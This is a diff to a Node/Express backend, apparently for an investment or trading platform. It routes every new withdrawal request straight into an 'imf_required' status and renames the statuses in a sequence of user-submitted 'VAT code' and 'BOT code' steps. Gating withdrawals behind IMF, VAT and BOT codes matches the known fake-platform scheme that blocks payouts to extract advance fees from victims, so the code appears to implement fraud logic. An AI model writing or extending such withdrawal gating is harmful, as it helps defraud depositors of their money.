@@ -554,15 +554,15 @@ finalPaymentDetails = paymentDetails
 }
 
 // Create withdrawal request
-const withdrawalRequest = await WithdrawalRequest.create({
-user: req.user._id,
-amount,
-paymentMethod: withdrawMethod,
-paymentDetails: finalPaymentDetails,
-status: 'pending',
-ipAddress: req.ip,
-userAgent: req.get('User-Agent')
-})
+    const withdrawalRequest = await WithdrawalRequest.create({
+      user: req.user._id,
+      amount,
+      paymentMethod: withdrawMethod,
+      paymentDetails: finalPaymentDetails,
+      status: 'imf_required',
+      ipAddress: req.ip,
+      userAgent: req.get('User-Agent')
+    })
 
 res.status(201).json({
 message: 'Withdrawal request submitted successfully',
@@ -775,7 +775,7 @@ router.post('/withdrawal/:id/vat-code', authenticateToken, async (req, res) => {
       code: vatCode.trim(),
       submittedAt: new Date()
     };
-    withdrawalRequest.status = 'vat_submitted';
+    withdrawalRequest.status = 'vat_pending';
     
     await withdrawalRequest.save();
 
@@ -812,8 +812,8 @@ router.post('/withdrawal/:id/bot-code', authenticateToken, async (req, res) => {
     }
 
     // Check if withdrawal is in the correct status
-    if (withdrawalRequest.status !== 'bot_pending') {
-      return res.status(400).json({ message: 'BOT code can only be submitted for withdrawals in BOT pending status' });
+    if (withdrawalRequest.status !== 'bot_required') {
+      return res.status(400).json({ message: 'BOT code can only be submitted for withdrawals requiring BOT verification' });
     }
 
     // Update withdrawal with BOT code
@@ -821,7 +821,7 @@ router.post('/withdrawal/:id/bot-code', authenticateToken, async (req, res) => {
       code: botCode.trim(),
       submittedAt: new Date()
     };
-    withdrawalRequest.status = 'bot_submitted';
+    withdrawalRequest.status = 'bot_pending';
     
     await withdrawalRequest.save();
 
